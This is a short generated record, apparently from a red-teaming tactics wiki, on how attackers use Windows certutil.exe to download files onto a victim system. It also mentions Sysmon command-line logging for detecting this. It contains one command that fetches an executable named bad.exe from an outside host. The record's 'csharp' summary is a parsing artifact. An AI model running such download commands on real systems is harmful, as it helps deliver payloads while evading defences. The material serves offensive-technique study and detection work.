---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Downloading Files with Certutil

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-downloading-file-with-certutil` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/downloading-file-with-certutil.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

csharp

## Preserved Body

````markdown
## Execution

```csharp
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

![](<../../_assets/certutil-download.gif>)

## Observations

Sysmon commandling logging is a good place to start for monitoring suspicious `certutil.exe` behaviour:

![](<../../_assets/certutil-sysmon.png>)
````

## Source Verification

[source record](../../sources/redteamingtactics/downloading-files-with-certutil.md)

## Evidence Excerpt

```text
_asset_filenames:
- certutil-download.gif
- certutil-sysmon.png
_body: '---
description: Downloading additional files to the victim system using native OS binary.
---
# Downloading Files with Certutil
## Execution
```
